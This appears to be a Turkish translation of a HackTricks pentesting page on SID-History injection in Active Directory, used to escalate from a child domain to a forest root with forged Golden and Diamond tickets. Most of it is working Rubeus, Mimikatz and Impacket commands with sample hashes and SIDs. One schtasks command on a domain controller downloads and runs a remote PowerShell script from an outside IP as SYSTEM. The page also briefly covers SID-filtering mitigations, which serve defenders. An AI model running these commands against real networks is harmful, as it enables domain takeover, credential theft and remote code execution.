# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack**'in amacı, eski domain'deki kaynaklara erişimin devam etmesini sağlarken **user migration between domains** işlemlerine yardımcı olmaktır. Bu işlem, kullanıcının önceki Security Identifier'ının (SID) yeni hesabının **SID History** alanına eklenmesiyle gerçekleştirilir. Özellikle, parent domain'deki yüksek ayrıcalıklı bir grubun (örneğin Enterprise Admins veya Domain Admins) SID'si SID History alanına eklenerek bu süreç manipüle edilebilir. Bu istismar, parent domain içindeki tüm kaynaklara erişim sağlar.<sup>[[1]](#references)[[2]](#references)</sup>

Bu saldırıyı gerçekleştirmek için iki yöntem vardır: **Golden Ticket** veya **Diamond Ticket** oluşturmak.

**"Enterprise Admins"** grubunun SID'sini belirlemek için öncelikle root domain'in SID'sini bulmak gerekir. Bu SID belirlendikten sonra, root domain'in SID'sine `-519` eklenerek Enterprise Admins grubunun SID'si oluşturulabilir. Örneğin, root domain SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun SID'si `S-1-5-21-280534878-1496970234-700767426-519` olur.<sup>[[1]](#references)</sup>

Ayrıca sonu **512** ile biten **Domain Admins** gruplarını da kullanabilirsiniz.

Başka bir domain'deki bir grubun (örneğin "Domain Admins") SID'sini bulmanın başka bir yolu şöyledir:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Bir trust relationship içinde SID history'yi devre dışı bırakmanın mümkün olduğunu ve bunun bu attack'in başarısız olmasına neden olacağını unutmayın.

[**docs**](https://technet.microsoft.com/library/cc835085.aspx)'a göre:<sup>[[3]](#references)</sup>
- netdom tool'u kullanarak **forest trust'larda SIDHistory'yi devre dışı bırakma** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- netdom tool'u kullanarak **external trust'lara SID Filter Quarantining uygulama** (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Tek bir forest içindeki domain trust'larına SID Filtering uygulamak** önerilmez; çünkü bu desteklenmeyen bir configuration'dır ve breaking change'lere neden olabilir. Bir forest içindeki domain güvenilir değilse forest'ın üyesi olmamalıdır. Bu durumda öncelikle trusted ve untrusted domain'leri ayrı forest'lara ayırmak, ardından SID Filtering'in uygulanabileceği bir interforest trust oluşturmak gerekir.

Bunu bypass etme hakkında daha fazla bilgi için şu post'a bakın: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Bunu en son denediğimde **`/ldap`** arg'ını eklemem gerekti.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) ile KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Golden tickets hakkında daha fazla bilgi için:


{{#ref}}
golden-ticket.md
{{#endref}}


Diamond tickets hakkında daha fazla bilgi için:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Ele geçirilmiş domain’in KRBTGT hash’ini kullanarak root’un DA’sına veya Enterprise admin’e ayrıcalık yükseltin:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Saldırıyla elde edilen izinlerle yeni domain'de örneğin bir DCSync attack gerçekleştirebilirsiniz:


{{#ref}}
dcsync.md
{{#endref}}

### Linux'tan

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) ile manuel olarak
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) kullanarak otomatik

Bu, **child domain'den parent domain'e yükseltmeyi otomatikleştiren** bir Impacket script'idir. Script şunlara ihtiyaç duyar:

- Hedef Domain Controller
- Child domain'deki bir admin kullanıcısının bilgileri

Akış şu şekildedir:

- Parent domain'deki Enterprise Admins grubunun SID'sini alır
- Child domain'deki KRBTGT hesabının hash'ini alır
- Bir Golden Ticket oluşturur
- Parent domain'e giriş yapar
- Parent domain'deki Administrator hesabının kimlik bilgilerini alır
- `target-exec` switch'i belirtilirse, Psexec üzerinden parent domain'in Domain Controller'ına authentication yapar.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Kaynaklar

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Security Identifier (SID) nedir? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Trusts için Güvenlik Hususları - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
